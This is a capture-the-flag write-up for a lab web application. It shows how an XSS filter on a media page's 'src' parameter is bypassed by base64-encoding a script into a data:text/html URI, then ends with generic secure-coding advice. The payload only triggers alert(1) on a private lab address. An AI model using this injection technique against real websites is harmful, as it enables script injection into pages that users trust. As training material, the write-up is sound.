# NSA page

__http://192.168.99.101/index.php?page=media&src=nsa__

## Description
We see eagle on the page. However if we change nsa in the end of the url we get the following.

```
http://192.168.99.101/index.php?page=media&src=blabla
```
we get no found.
The tag ```src``` is the attribute of ```<object>```
For example let's link to the picture.
```http://192.168.99.101/?page=media&src=/images/42.jpeg```
We see that the javascript works incorrect.
For page ```curl -s '192.168.99.101/?page=media&src=<script>alert(1)</script>' | grep 'object'```
We see page source ```<table style="margin-top:-68px;"><center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center> <tr style="background-color:transparent;border:none;"><td style="vertical-align:middle;"><object data="&lt;script&gt;alert(1)&lt;/script&gt;"></object></td></tr></table>				</div>```

## Form Outputs
So the page must use htmlspecialchars() or htmlentities()
It is possible to encode a JavaScript alert using base64 and include it in a data URI scheme. The data URI scheme allows for embedding data directly into a web page, without the need for a separate file. The format for this scheme includes specifying the media type (in this case, text/javascript) and indicating that the data is encoded in base64.

```
data:[<media type>][;base64],<data>
```
We get the following rows
```
echo -n '<script>alert(1)</script>' | base64           
```
The output is ```PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==```

## Flag
So try to input the request to the browser
```
http://192.168.99.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
And we get the next flag.

## Safety
Developers should follow secure coding practices and regularly test their applications for vulnerabilities, while users should be cautious when visiting unfamiliar websites and ensure that their browsers and operating systems are up to date with the latest security patches. Proper input validation and output encoding should also be implemented to prevent attackers from injecting malicious code into the application and compromising user data or the entire system.